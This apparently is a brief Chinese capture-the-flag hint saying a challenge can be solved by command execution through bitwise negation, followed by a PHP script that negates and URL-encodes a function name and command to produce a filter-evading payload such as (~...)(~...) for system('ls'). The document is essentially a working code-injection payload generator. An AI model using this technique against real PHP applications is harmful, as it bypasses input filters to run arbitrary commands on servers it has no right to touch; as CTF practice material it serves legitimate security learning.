这道题可以用取反的方法执行命令

先用取反脚本得到system(‘ls’);

<?php

function generateNegatePayload($function, $command) {

    $func_neg = ~$function;

    $cmd_neg = ~$command;

    $func_url = urlencode($func_neg);

    $cmd_url = urlencode($cmd_neg);

    echo "Payload: (~{$func_url})(~{$cmd_url});";

}

generateNegatePayload('system', 'ls');

?>
